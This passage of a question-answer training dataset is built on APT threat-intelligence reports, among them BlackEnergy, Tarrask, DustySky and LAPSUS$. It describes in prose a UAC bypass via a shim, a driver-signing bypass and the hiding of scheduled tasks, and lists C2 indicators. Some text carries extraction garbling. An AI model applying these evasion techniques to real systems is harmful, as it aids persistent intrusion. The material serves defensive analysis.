\u0141le is communicating with a Kuwait based IP address: 83.170.33.60, owned by German company iABG Mbh, which provides satellite communication services.\nThe malware opens an SSL connection over port 443 using a digital certi\u0141cate that expired in 2010. The certi\u0141cate was issued for security company Core Security, the creators of the offensive suite Core Impact, for the address *coreimpactagent.net.\n[8] It was issued by Thawte certi\u0141cate authority.\n[10]\nCerti\u0141cate Fingerprint MD5: 9C 80 C2 47 40 6D 6C ED FC E0 08 AE EF D9 98 90\nUsing a proxy and SSL stripping, the following communication pattern over HTTP can be seen:\nBig Headline: Related incidents\nSearching for speci\u0141c strings from the malicious \u0141le, we found another \u0141le that we believe is related to this campaign. The \u0141le name is \"svchost 67.exe\" (MD5:\n916be1b609ed3dc80e5039a1d8102e82 ) and it was uploaded to Virus Total[5] on 2 June 2014, more than two months earlier than \"Operation Protective Edge.xlsb\". It was uploaded twice from Latvia \u2013 potentially to test the malware's detection rate.\n\"svchost 67.exe\" communicated with 83.170.33.37, which is on the same /26 netblock as the address \"Operation Protective Edge.xlsb\"\nis commutating with.\n\nBased on the above text, answer a question. What methods does the Gholee malware employ to communicate with its command and control server, and how does it attempt to conceal this communication?",
    "output": "The Gholee malware communicates with a Kuwait-based IP address (83.170.33.60), owned by a German company providing satellite communication services. It establishes an SSL connection over port 443 using an expired digital certificate issued for Core Security, the creators of the offensive suite Core Impact, for the address '*coreimpactagent.net'. The certificate was issued by Thawte certificate authority and has a fingerprint MD5 of '9C 80 C2 47 40 6D 6C ED FC E0 08 AE EF D9 98 90'. To observe the communication pattern, a proxy and SSL stripping can be used, revealing an HTTP communication pattern. This use of an expired certificate and SSL connection is likely intended to conceal the communication from detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: UKRAINE-RELATED PROXIES\nWhile examining the samples collected during our BlackEnergy monitoring, we noticed that samples from this year had been updated to support the use of proxy servers while connecting to their C&C servers. This contrasts with earlier BlackEnergy 2 variants, which do not support proxy servers. In some network setups, a proxy server is needed to allow internal users to access the Internet . BlackEnergy\u00b9s use of a proxy server may indicate that the gang has prior knowledge of the target organization's internal setup to note of this requirement.\nFor example, in one sample the configuration uses  the proxy server associated with the Ukrainian Railway (image 6). The configuration from another sample also shows it using an internal proxy under the giknpc domain (image 7). The domain giknpc.com.ua in turn hosts 3 domains (image 8), one of which is for the city of Dnipropetrovsk (image 9), the fourth-largest city in Ukraine, located in the southeast. Based on the set proxy servers for the different samples, we concluded that the gang is targeting Ukrainian government organizations.\nImage 2:\nDecoy document circa 2012\nImage 3:\nStrings from a sample circa 2012\nImage 4:\nDecoy document created using a Russian version of Office\nImage 5:\n2014 dropper sample disguised as a document. The filename means password list\nImage 6:\nConfiguration using Ukrainian Railway's proxy\nImage 7:\nConfiguration using internal proxy under giknpc domain\nBig Headline: TIMELINE\nAlthough they may have started much earlier, the earliest BlackEnergy sample we could attribute to the Quedagh gang is from December 14, 2010.\nInitially, the group seemed to prefer to use the filename of the Windows registry editor (regedt32.exe), presumably because the installer needs administrator rights to install its driver component and therefore would try to request for the highest available rights (image 10), if possible. As this triggers a notification message visible to the user, said user is more likely to grant permission if it appears to be the registry editor that is requesting for permission, since it is normal to run it with administrator rights. Experienced users though are less likely to be taken in, thereby decreasing the likelihood of a successful infection.\nStarting April 2013, modified installers appeared showing that the Quedagh group found a way to bypass the default User Account Control (UAC) settings. With this change, the user's permission is no longer need (image 11). At this point, the gang also began to use the Windows installer program filename msiexec.exe.\nMedium Headline: 64-bit support\nWithin a month of Windows 8.1's release, the gang  had quickly added support for 64-bit systems, possibly anticipating that more of their target systems will be migrated to 64-bit systems. They also employ a neat trick to bypass the driver signing requirement on 64-bit Windows systems. As a side note, this latest finding updates and supercedes previously published research related to BlackEnergy's driver signing behavior .\nHowever, this trick doesn't work on Windows 8 and later systems. The driver also crashes occassionally. This could be the reason for the stand-alone non-persistent BlackEnergy variant.\nMedium Headline: UAC BYPASS DURING INSTALLATION\nThe malware will only attempt to infect a system if the current user is a member of the local administrator group. If not, it will re-launch itself as Administrator on Vista. This in effect will trigger a UAC prompt. On Windows 7 and later however, the malware will attempt to bypass the default UAC settings. It exploits a backward-compatibility feature found in newer versions of Windows. BlackEnergy installers include a Shim Database, or a \"fix\", instructing SndVol.exe to execute cmd.exe (image 15, below) instead in order to resolve the incompatibility.\nSndVol.exe is one of the Windows executables that will be automatically elevated upon execution because it is thought to be safe. What harm can a volume control cause? With the malicious \"fix\" installed however, executing SndVol.exe will execute the not-so-safe file cmd.exe instead, which can then be used to install the malware while in an elevated state.\nMedium Headline: DRIVER SIGNING POLICY BYPASS\nThe role of the installer is to set up the malware's persistent component, which is the driver component. On 64-bit Windows systems, Microsoft has enforced a policy that requires all drivers to be signed as a security precaution. Signing provides a way to identify a driver to its author, effectively reducing the number of malware developers willing to take the risk. To allow developers to test their drivers during development, Microsoft provides a TESTSIGNING boot configuration option; while in this mode, a watermark is displayed on the screen to make it obvious to users and to prevent malware from exploiting this option.\nBlackEnergy enables the TESTSIGNING option to load its driver component; to hide this change from the user, the malware removes the watermark by removing the relevant strings in the user32.dll.mui of the system. In Windows 8 and up however, the strings are no longer stored in user32.dll.mui, so the trick will not work. This may be one of the reasons for the existence of a standalone non-persistent BlackEnergy variant. The malware does not infect 64-bit Windows systems that are older than Vista.\nImage 15: Malicious fix to redirect SndVol.exe to cmd.exe. Inset: Test Mode watermark\nMedium Headline: HIJACKING EXISTING DRIVERS\nThe installer will try to locate an existing driver service that is inactive. The service found will usually be a legitimate one that is disabled because it is no longer used or because it is set to start only on demand. The installer will drop the driver component using the corresponding path of the service.  It will overwrite the existing driver if necessary. The hijacked service is then set to start automatically. This is how the malware is able to survive after a reboot. By doing this, the gang may be hoping that their malicious driver will be overlooked by administrators or investigators who are so used to seeing those legitimate services.\nQuestion: How did the Quedagh gang adapt BlackEnergy to bypass driver signing policies on 64-bit Windows systems, and what limitations did they encounter?",
    "output": "Answer: The Quedagh gang enabled the TESTSIGNING boot configuration option to load BlackEnergy's driver component on 64-bit Windows systems. To hide this change from the user, the malware removed the relevant strings in the user32.dll.mui file to eliminate the watermark indicating test mode. However, this trick does not work on Windows 8 and later systems because the strings are no longer stored in user32.dll.mui. Additionally, the malware does not infect 64-bit Windows systems older than Vista. These limitations may have contributed to the development of a standalone non-persistent BlackEnergy variant. The gang also employed a technique of hijacking existing driver services by locating inactive legitimate services, overwriting their drivers, and setting them to start automatically, thus ensuring persistence after a reboot.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 2 Analysis\nTelsy detected several infection chains starting with different initial stages: document template, LNK file or a CPL file representing a new type of downloader very similar to a shellcode in the way the stack is used.\nThe second phase uses the BabaDeda crypter to run the infostealer called OutSteel.\nBabaDeda Crypter is an evasive malware that acts like an installer and executes a shellcode stored encrypted in a file usually, xml or pdf, dropped by the installer self. The main binary of BabaDeda Crypter it's a malicious binary, compiled with text segment writable, that has only the purpose to load the 1st malicious library.\nThe first malicious DLL side loaded decrypt the shellcode storing it in the text section of the main binary and loads/execute the secondary malicious library in another thread then return to the decrypted shellcode.\nThe decrypted shellcode represents the real payload embedded in the installer by the threat actor while the 2nd malicious library can embed every kind of malware. In the samples that we found the 2nd library is used sometime as downloader and in other cases as thread to achieve persistence, it depends by the stage.\nexecution process graph\nBelow a kind of time line that describes how the tools were employed in the time, most likely, by the same threat actor.\n\nQuestion: How does the BabaDeda crypter function within the infection chain of the APT campaign, and what role does it play in executing the infostealer OutSteel?\n\nAnswer:",
    "output": "The BabaDeda crypter acts as an evasive malware that functions similarly to an installer. It executes a shellcode stored in an encrypted file, typically an XML or PDF, which is dropped by the installer itself. The main binary of BabaDeda Crypter is a malicious binary, compiled with a writable text segment, whose sole purpose is to load the first malicious library. This first malicious DLL, once sideloaded, decrypts the shellcode and stores it in the text section of the main binary. It then loads and executes the secondary malicious library in another thread before returning to the decrypted shellcode. The decrypted shellcode represents the real payload embedded in the installer by the threat actor. The second malicious library can embed various types of malware; in the observed samples, it is sometimes used as a downloader and at other times as a thread to achieve persistence, depending on the stage of the infection chain. Ultimately, the BabaDeda crypter plays a crucial role in the execution of the infostealer OutSteel by facilitating its loading and execution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the primary purpose of PowerRatankba, and how does it communicate with its command and control (C&C) server once executed on an infected device?",
    "output": "PowerRatankba serves as a first-stage reconnaissance tool and is used for deploying further stage implants on interesting targets. It communicates with its C&C server via HTTP. Upon execution, PowerRatankba sends detailed information about the infected device to its C&C server through a BaseInfo HTTP POST request. This information includes the computer name, IP addresses, OS boot time and installation date, language settings, status of specific ports (139, 3389, and 445), a process list, and output from certain WMIC commands. This data helps the attackers assess the environment and decide on further actions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: tl;dr\nThis post describes the techniques, tactics and procedures we observed during recent LAPSUS$ incidents.\nOur findings can be summarised as below:\nAccess and scraping of corporate Microsoft SharePoint sites in order to identify any credentials which may be stored in technical documentation.\nAccess to local password managers and databases to obtain further credentials and escalate privileges.\nLiving of the land \u2013 tools such as RVTools to shut down servers and ADExplorer to perform reconnaissance.\nCloning of git repositories and extraction of sensitive API Keys.\nUsing compromised credentials to access corporate VPNs.\nDisruption or destruction to victim infrastructure to hinder analysis and consume defensive resource.\nBig Headline: Initial access\nThreat Intelligence shows that LAPSUS$ utilise multiple methods to gain Initial access.\nThe main source of initial access is believed to occur via stolen authentication cookies which would grant the attacker access to a specific application. These cookies are usually in the form of Single sign-on (SSO) applications which would allow the attacker to pivot into other corporate applications ultimately bypassing controls such as multi-factor authentication (MFA).\nBig Headline: Credential access and Privilege escalation\nCredential Harvesting and privileged escalation are key components of the LAPSUS$ breaches we have seen, with rapid escalation in privileges the LAPSUS$ group have been seen to elevate from a standard user account to an administrative user within a couple of days.\nIn the investigations conducted by NCC Group, little to no malware is used. In one case NCC Group observed LAPSUS$ using nothing more than the legitimate Sysinternals tool ADExplorer, which was used to conduct reconnaissance on the victim's environment.\nAccess to corporate VPNs is a primary focus for this group as it allows the threat actor to directly access key infrastructure which they require to complete their objectives.\nIn our incident response cases, we saw the threat actor leveraging compromised employee email accounts to email helpdesk systems requesting access credentials or support to get access to the corporate VPN.\nBig Headline: Impact\nNCC Group has observed disruption and destruction to client environments by LAPSUS$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities.\nThe theft of data reported appears to heavily be focused on application source code or proprietary technical information. With a targeting of internal source code management or repository servers. These git repositories can contain not only commercially sensitive intellectual property, but also in some cases may include additional API keys to sensitive applications including administrative or cloud applications.\nBig Headline: Recommendations\nEnsure that Cloud computing environments have sufficient logging enabled.\nEnsure that cloud administrative access is configured to prevent unauthorised access to resources and that API keys are not overly permissive to the permissions they require.\nUtilise MFA for user authentication on both cloud and remote access solutions to help reduce the risk of unauthorised access.\nEnsure logging is in place to record MFA device enrolment\nSecurity controls such as Conditional Access can help restrict or prevent unauthorised access based on criteria such as geographical location.\nImplement activities to detect and investigate anomalies in VPN access.\nEnsure a system is in place to record all helpdesk queries.\nAvoid using SMS as an MFA vector to avoid the risk of SIM swapping.\nSecuring source code environments to ensure that users can only access the relevant repositories.\nSecret Scanning[1][2]  on source code repositories should be conducted to ensure that sensitive API credentials are not stored in source code. GitHub and Gitlab offer detection mechanisms for this\nRemote Desktop services or Gateways used as a primary or secondary remote access solution should be removed from any corporate environment in favour for alternative solutions such as secured VPNs, or other Remote Desktop applications which mitigate common attack techniques such as brute force or exploitation and can offer additional security controls such as MFA and Conditional Access.\nCentralise logging including cloud applications (SIEM solution).\nOffline or immutable backups of servers should be taken to ensure that in the event of a data disruption or destruction attack, services can be restored.\nReduce MFA token/Session cookie validity times\nEnsure principle of least privilege for user accounts is being adhered to.\nSocial engineering awareness training for all staff.\n\nHow does LAPSUS$ typically gain initial access to corporate environments, and what methods do they employ to bypass multi-factor authentication (MFA)?",
    "output": "LAPSUS$ primarily gains initial access through stolen authentication cookies, particularly those associated with Single Sign-On (SSO) applications. These cookies allow the attacker to access specific applications and pivot into other corporate applications, effectively bypassing controls such as multi-factor authentication (MFA). This method is highly effective because it leverages legitimate access tokens, making it difficult for traditional security measures to detect.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background + Key findings\nTransparent Tribe, also known as PROJECTM or MYTHIC LEOPARD, is a highly prolific group whose activities can be traced as far back as 2013. In the last four years, this APT group has never taken time off. They continue to hit their targets, which typically are Indian military and government personnel.\nThis is the second of two articles written to share the results of our recent investigations into Transparent Tribe. In the previous article, we described the various Crimson RAT components and provided an overview of impacted users. Here are some of the key insights that will be described in this part:\nWe found a new Android implant used by Transparent Tribe for spying on mobile devices. It was distributed in India disguised as a porn-related app and a fake national COVID-19 tracking app.\nNew evidence confirms a link between ObliqueRAT and Transparent Tribe.\n\nQuestion: How does the Transparent Tribe APT group leverage mobile platforms for espionage, and what specific techniques do they employ to distribute their malicious Android implants?\n\nAnswer:",
    "output": "Transparent Tribe, also known as PROJECTM or MYTHIC LEOPARD, leverages mobile platforms for espionage by using a new Android implant designed for spying on mobile devices. This implant is distributed through deceptive means, disguised as a porn-related app and a fake national COVID-19 tracking app. These tactics aim to trick unsuspecting users into installing the malware, thereby allowing the APT group to gain unauthorized access to sensitive information on the targeted devices.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ThreatConnect reviews activity targeting Bellingcat, a key contributor in the MH17 investigation.\nIntroduction\nSince posting about the (<https://threatconnect.com/blog/tapping-into-democratic-national-committee/>)DNC hack, each time we published a blog post on a BEAR-based topic we thought it was going to be our last. But like the Death Star's gravitational pull, the story keeps drawing us back in as new information comes to light. Following our post on (<https://threatconnect.com/blog/does-a-bear-leak-in-the-woods/>)DCLeaks as a Russian influence operation, (<https://www.bellingcat.com/>)Bellingcat founder (<https://www.bellingcat.com/author/eliothiggins/>)Eliot Higgins reached out to us. Bellingcat, a group of citizen investigative journalists, has published articles critical of Russia and has been a key contributor to the international investigation of the shootdown of (<https://en.wikipedia.org/wiki/Malaysia_Airlines_Flight_17>)Malaysian Airlines Flight 17 (MH17) over Ukraine in 2014.\nHiggins shared data with ThreatConnect that indicates Bellingcat has come under sustained targeting by Russian threat actors, which allowed us to identify a 2015 spearphishing campaign that is consistent with FANCY BEAR's tactics, techniques, and procedures. We also analyzed a February 2016 attack by CyberBerkut \u2014 a group claiming to be pro-Russian Ukrainian hacktivists but also a suspected front for Moscow \u2014 against Russia-based Bellingcat contributor (<https://twitter.com/RuslanLeviev>)Ruslan Leviev, where (<https://threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/>)CyberBerkut defaced the Bellingcat website and leaked Leviev's personal details. As evidenced by these efforts and the attack on the World Anti-Doping Agency, organizations that negatively impact Russia's image can expect Russian cyber operations intended to retaliate publicly or privately, influence, or otherwise maliciously affect them. The (<http://www.activeresponse.org/the-diamond-model/>)Diamond Model below summarizes the activity that Bellingcat experienced.\nQ: How did the tactics, techniques, and procedures (TTPs) employed by FANCY BEAR in the 2015 spearphishing campaign against Bellingcat align with their typical modus operandi? Additionally, what insights can be drawn from the attack on Bellingcat contributor Ruslan Leviev by CyberBerkut in February 2016 regarding the broader strategy of Russian cyber operations?",
    "output": "The 2015 spearphishing campaign against Bellingcat was consistent with FANCY BEAR's known TTPs, indicating a pattern of targeted and sophisticated attacks aimed at compromising high-value targets. This consistency underscores the threat actor's ability to leverage advanced techniques to infiltrate and gather sensitive information. Furthermore, the attack on Ruslan Leviev by CyberBerkut, which involved defacing the Bellingcat website and leaking personal details, highlights a broader strategy of Russian cyber operations. These operations are designed to retaliate against organizations that negatively impact Russia's image, either through public shaming or private influence. Such actions demonstrate the multifaceted approach of Russian threat actors, combining both technical prowess and psychological warfare to achieve their objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Indicators & Mitigation Strategies:\nThe following three (3) tables will provide information about some of the malware observed to be njRAT itself or carrier files that once executed dropped njRAT in the victim system. The first table contains the MD5 hash , size, domain, port, njRat version, and campaign ID. The second table contains information about the file system artifacts (kelogger file location, files created). The third table contains information about registry key entrenchment for persistence. Then, a list of network+1800.652.4020 indicators will be provided to assist network defenders with the creation of signatures to be deployed to the sensors.\nMedium Headline: Table 1: MD5 hash, size, domain/IP, port, njRat version, and campaign ID\nNote: The Campaing ID named \"HacKed\" is the default string in the njRAT Builder interface.\nNote: The copy of njRAT created with the filename \"Trojan.exe\", is the default filename string in the njRAT Builder interface. The Keylogger file location referred to as \"[CWD]\\.tmp\", refers to the location from which the original malware is executed. It was observed that this was used when the malware was embedded in a legitimate looking application, and the kelogger files get created in the directory of that application (i.e. C:\\Program Files\\Facebook\\QuadAtom\\.tmp).\n\nIn the context of the njRAT malware, how does the 'Campaign ID' and the default filename 'Trojan.exe' play a role in identifying and mitigating threats? Explain the significance of these default values and how they can be leveraged by cybersecurity experts.",
    "output": "The 'Campaign ID' named 'HacKed' and the default filename 'Trojan.exe' are both default strings in the njRAT Builder interface. These default values can be significant indicators for cybersecurity experts to identify potential njRAT infections. By recognizing these default settings, defenders can create detection rules and signatures that look for these specific identifiers. For example, if a file named 'Trojan.exe' is detected on a system, it could immediately raise suspicion and trigger further investigation. Similarly, the presence of the 'HacKed' Campaign ID can help in attributing the attack to a particular threat actor or campaign. Leveraging these default values allows for more effective threat hunting and incident response, enabling security teams to quickly identify and mitigate potential njRAT infections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Right on schedule: Maintaining persistence via scheduled tasks\nWindows Task Scheduler is a service that allows users to perform automated tasks (scheduled tasks) on a chosen computer for legitimate administrative purposes (e.g., scheduled updates for browsers and other applications).\nThroughout the course of our research, we've found that threat actors commonly make use of this service to maintain persistence within a Windows environment.\nWe've noted that the Tarrask malware generates several artifacts upon the creation of a scheduled task, whether using the Task Scheduler GUI or the  command line utility. Profiling the use of either of these tools can aid investigators in tracking this persistence mechanism.\nThe following registry keys are created upon creation of a new task:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\ {GUID}\nThe first subkey, created within the Tree path, matches the name of the scheduled task. The values created within it (Id, Index, and SD) contain metadata for task registration within the system. The second subkey, created within the Tasks path, is a GUID mapping to the Id value found in the Tree key. The values created within (Actions, Path, Triggers, etc.) contain the basic parameters necessary to facilitate execution of the task.\nTo demonstrate the value in the artifacts generated, shown in the following figures, we have created \"My Special Task\" which is set to execute the binary \"C:\\Windows\\System32\\calc.exe\" on a regular interval.\nSimilar information is also stored within an extensionless XML file created within C:\\Windows\\System32\\Tasks, where the name of the file matches the name of the task. This is displayed in Figure 2, where we name the task \"My Special Task\" as an example.\nNote that the \"Actions\" value stored within the Tasks\\{GUID} key points to the command line associated with the task. In Figure 2, there is a reference to \"C:\\Windows\\System32\\calc.exe\" within the \"Edit Binary Value\" dialog, and there is a path referenced within the \"<Command>\" section in the extensionless XML file in Figure 3. The fact that this value is stored within two different locations can prove useful in recovering information regarding the task's purpose in the event the threat actor has taken steps to cover their tracks.\nFinally, there are two Windows event logs that record actions related to the creation and operation of Scheduled Tasks \u2013 Event ID 4698 within the Security.evtx log, and the Microsoft-Windows-TaskScheduler/Operational.evtx log.\nNeither of these are audited by default and must be explicitly turned on by an administrator. Microsoft-Windows-TaskScheduler/Maintenance.evtx will exist by default, but only contains maintenance-related information for the Task Scheduler engine.\nBig Headline: Effectively hiding scheduled tasks\nIn this scenario, the threat actor created a scheduled task named \"WinUpdate\" via HackTool:Win64/Tarrask in order to re-establish any dropped connections to their command and control (C&C) infrastructure. This resulted in the creation of the registry keys and values described in the earlier section, however, the threat actor deleted the SD value within the Tree registry path.\nIn this context, SD refers to the Security Descriptor, which determines the users allowed to run the task. Interestingly, removal of this value results in the task \"disappearing\" from \"schtasks /query\" and Task Scheduler. The task is effectively hidden unless an examiner manually inspects the aforementioned registry paths.\nIssuing a \"reg delete\" command to delete the SD value will result in an \"Access Denied\" error even when run from an elevated command prompt. Deletion must occur within the context of the SYSTEM user. It is for this reason that the Tarrask malware utilized token theft to obtain the security permissions associated with the lsass.exe process. Upon execution of the token theft, the malware could operate with the same privileges as LSASS, making the deletion possible.\nIt is also important to note that the threat actor could have chosen to completely remove the two registry keys within Tree and Tasks, and the XML file created within C:\\Windows\\System32\\Tasks. This would effectively remove the on-disk artifacts associated with the scheduled task, but the task would continue to run according to the defined triggers until the system rebooted, or until the associated svchost.exe process responsible for executing the task was terminated.\nIt's possible the threat actor wanted to ensure persistence across reboots and therefore chose not to perform those steps, instead deleting only the SD value; however, we also speculate that the threat actor was unaware that the task would continue to run even after these components were removed.\nBig Headline: Recommendations and cyber resilience guidance\nJob or task schedulers are services that have been present in the Windows operating system for many years. The attacks we described signify how the threat actor HAFNIUM displays a unique understanding of the Windows subsystem and uses this expertise to mask activities on targeted endpoints to maintain persistence on affected systems and hide in plain\nsight.\nAs such, we recognize that scheduled tasks are an effective tool for adversaries to automate certain tasks while achieving persistence, which brings us to raising awareness about this oft-overlooked technique. We also want to bring attention to the fact that threat actors may utilize this method of evasion to maintain access to high value targets in a manner that will likely remain undetected. This could be especially problematic for systems that are infrequently rebooted (e.g., critical systems such as domain controllers, database servers, etc.).\nThe techniques used by the actor and described in this post can be mitigated or detected by adopting the following recommendations and security guidelines1:\nEnumerate your Windows environment registry hives looking in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree registry hive and identify any scheduled tasks without SD (security descriptor) Value within the Task Key. Perform analysis on these tasks as needed.\nModify your audit policy to identify Scheduled Tasks actions by enabling logging \"TaskOperational\" within Microsoft-Windows-TaskScheduler/Operational. Apply the (<https://docs.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations>)recommended Microsoft audit policy settings suitable to your environment.\nEnable and centralize the following Task Scheduler logs. Even if the tasks are 'hidden', these logs track key events relating to them that could lead you to discovering a well-hidden persistence mechanism\nEvent ID 4698 within the Security.evtx log\nMicrosoft-Windows-TaskScheduler/Operational.evtx log\nThe threat actors in this campaign used hidden scheduled tasks to maintain access to critical assets exposed to the internet by regularly re-establishing outbound communications with C&C infrastructure. Remain vigilant and monitor uncommon behavior of your outbound communications by ensuring that monitoring and alerting for these connections from these critical  is in place.\nBig Headline: Microsoft Sentinel Detections\nMicrosoft Sentinel customers can use the following detection queries to look for this activity:\n: This query identifies a hash match related to Tarrask malware across various data sources.\n: This query uses Windows Security Events to detect attempts by malware to hide the scheduled task by deleting the SD (Security Descriptor) value. Removal of SD value results in the scheduled task \"disappearing\" from \"schtasks /query\" and Task Scheduler.\n: This query looks for Microsoft Defender AV detections related to Tarrask malware using SecurityAlerts table. In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as Device group, IP, logged on users etc. This way, the Microsoft Sentinel user can have all the pertinent device info in one view for the alerts.\n1 The technical information contained in this article is provided for general informational and educational purposes only and is not a substitute for professional advice. Accordingly, before taking any action based upon such information, we encourage you to consult with the appropriate professionals. We do not provide any kind of guarantee of a certain outcome or result based on the information provided. Therefore, the use or reliance of any information contained in this article is solely at your own risk.\n\nWhat are the implications of removing the SD value from the Tree registry path, and why might the threat actor choose not to completely remove the registry keys and XML file associated with the scheduled task?",
    "output": "Removing the SD value from the Tree registry path hides the scheduled task from traditional means of identification, but the task continues to run according to its defined triggers until the system reboots or the associated svchost.exe process is terminated. The threat actor might choose not to completely remove the registry keys and XML file to ensure persistence across reboots. Additionally, the threat actor might be unaware that the task would continue to run even after these components are removed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: SSL and digital certificates\nRecently, command and control communication changed from HTTP to HTTPS. The digital certificate used in the HTTPS traffic is either self-signed or uses a legitimate Comodo issued certificate.\nThe domain bulk-smtp[.]xyz, which is owned by the attackers, uses the following digital certificate:\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\n35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19\nSignature Algorithm: sha256WithRSAEncryption\nPrior to using the Comodo issued certificate, the attackers used a self-signed certificate, impersonating a Tel-Aviv, Israel based company called EMS. The organizational unity in the certificate is \"Email Markting Sales\" (note the misspelling of \"marketing\").\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number: 13229300438499639338 (0xb797eaa82fb0c02a)\nSignature Algorithm: sha256WithRSAEncryption\nIssuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml Validity Not Before: Nov 17 14:15:08 2015 GMT Not After : Nov 16 14:15:08 2016 GMT\nSubject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email\nMarkting Sales, CN=email-market.ml/emailAddress=info@email-market.ml\nFor another domain, smtp.gq, this self-signed certificate was used:\nCertificate:\nData:\nVersion: 1 (0x0)\nSerial Number: 12074485766838107425 (0xa79130d4e1e53d21)\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq /emailAddress=info@smtp.gq\nValidity\nNot Before: Nov 17 14:48:51 2015 GMT\nNot After : Dec 17 14:48:51 2015 GMT\nSubject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,\nCN=smtp.gq /emailAddress=info@smtp.gq\nDustySky communication uses some or all of the following paths when communicating with its command and control server:\nUpdate.php\nconn.php\ngeoiploc.php\nnews.htm\npass.php\npassho.php\npassyah.php\nMedium Headline: Infrastructure\nUsing PassiveTotal's attack analysis platform, we were able to visualize the last 6 months of data for key infrastructure used by the actors. It's worth noting that all IP addresses have been active in the past several weeks with many of the domains resolving to them being a combination (green squares) of dynamic DNS providers (blue squares) and registered domains (brown squares). These heatmaps allow us to identify interesting periods or changes in the infrastructure that may have been due to actors adjusting their tactics.\nReader:\nIn this graph, we can see the actors used a combination of dynamic DNS and registered domains up until December 23rd. On that day, the actors seem to remove the registered domain and strictly use dynamic DNS. It's unclear why this would occur, but it's possible that the server changed functions in the attack or was no longer needed.\nMedium Headline: 192.52.167.235\nIn this graph, the colors clearly segment activity that occurred. The primary period of interest appears to be when both dynamic DNS and registered domains are in use. This occurs from September 23rd to December 17th and has a number of days where new domains are associated to the IP address. While not entirely known, this period could reflect the actors going live in their operation. Based on emails sent and compilation dates, there were plenty of phishing campaigns going on during this period of time. It's also worth noting that this IP address is no longer showing any content which could mean it's been taken offline.\nMedium Headline: 45.32.13.169\nIn this graph, the gray blocks indicate that no activity was captured for a majority of the time. Starting November 9th, the actors introduced four unique, registered domains before then adding dynamic DNS providers. What's most interesting about this IP address is that the content for both dynamic DNS urls and registered domains lead to the same download page that hosts a Windows executable. It's unclear why the attackers continue to use both, but the move from registered domains to also using dynamic DNS domains could suggest the actors are beginning to wise up. The use of dynamic DNS infrastructure makes attribution and tracking more difficult as a dynamic DNS domain could be shared by unrelated parties.\nMedium Headline: Gaza Strip origins\nOnly one sample \u2013 aa288a5cbf4c897ff02238e851875660 \u2013 was uploaded to VirusTotal, shortly after it was compiled. Less than a minute and a half elapsed between compilation on August 8th 2015 at 10:31:12 and the first VirusTotal submission at 10:32:24. This sample was uploaded from Gaza.\nThe very short time frame between compilation and VirusTotal submission could indicate that the attacker is the one who has submitted the sample \u2013 in order to learn whether antivirus engines detect it.\n1\n1\n14 All attribution data in the table are taken from .\nMedium Headline: Individuals\nRecent samples had \"Last Saved By\" properties of the document point to a specific individual who we believe is one of the attackers. In his Social media accounts this individual defines himself as a Software Engineer who lives in Gaza. Public interactions on his YouTube page (such as videos he liked) are related to hacking tools and methods. We have decided not to disclose this individual's name in the public report.\n1\n1\n17 CITYNET \u2014 City Net Informatics, Internet and Communication Technologies and General Trade Ltd. (PS)\nBig Headline: Appendix A - Malicious email messages and lures\nBelow we present email and lure documents that were used in the campaign.\nSaudi Arabia boosts security on Yemen border\nGreek coastguard appears to sink refugee boat.exe\nUS delegation heading to Israel to discuss Iran terror funding eea2e86f06400f29a2eb0c40b5fc89a6\nSupermodel Bar Refaeli Stars in Israeli Spy Movie.exe\nISIS leader raped the American captive\nThe Truth About Your Sexual Peak , Don't worry\n\u0628\u0633\u0623\u0627\u0628 \u0641\u0631 \u0639 \u0627\u0635\u062d\u0644\u0646\u0627\u0629 \u0627\u0644\u062f\u0628\u0644\u0648\u0645\u064a\u0633\u0627\u0629 \u0646\u0639 \u0627\u0633\u0644\u064a\u0633\u064a \u062a\u062d\u0627\u0648\u0645\u0627\u0644 \u0639\u0627\u0642\u062a\u0627\u0647\u0644 \u0641 \u064a \u0646\u0644\u062f\u0646\n.exe\n(the reasons for lifting A-Sisi's diplomatic immunity and the possibility of his arrest in London)\nGoogle-Privacy.doc\nInvoice details.doc\nf94dfd49142bdae4a525997e4c0b944c\n\u0628\u0623\u0632\u0631 \u0645\u0627 \u062e\u064a \u0635 \u0635\u0645 \u0631 \u064a\u0641 \u062a \u064a\u0631\u0633\u0628\u0627\u062a \u0627\u062e\u0644\u0631\u0627\u0629\u064a\u062c 